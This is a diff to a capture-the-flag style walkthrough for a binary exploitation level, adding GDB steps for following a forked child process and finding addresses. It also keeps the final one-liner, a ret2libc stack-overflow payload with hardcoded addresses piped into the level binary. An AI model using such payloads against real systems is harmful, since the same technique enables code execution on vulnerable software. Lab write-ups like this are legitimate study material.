@@ -4,9 +4,18 @@
 
 This level exploits a **stack buffer overflow**. The program has an input buffer that can be overflowed to hijack the return address.
 
-**The vulnerability** exists in a function that reads user input into a fixed-size buffer without bounds checking:
+**The vulnerability** exists in the child process, that reads user input into a fixed-size buffer without bounds checking.
 
 ### The Addresses (found via GDB)
+
+```bash
+ # GDB must follow the child after fork().
+(gdb) set follow-fork-mode child 
+(gdb) set detach-on-fork off
+(gdb) break gets
+(gdb) run < <(python -c 'print "A"*160')
+(gdb) finish
+```
 
 ```bash
 (gdb) info proc map
@@ -60,8 +69,3 @@ fgets writes 156+ bytes into 100-byte buffer overwrites the return address on th
 ```bash
 (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level04
 ```
-
-
-
-
-
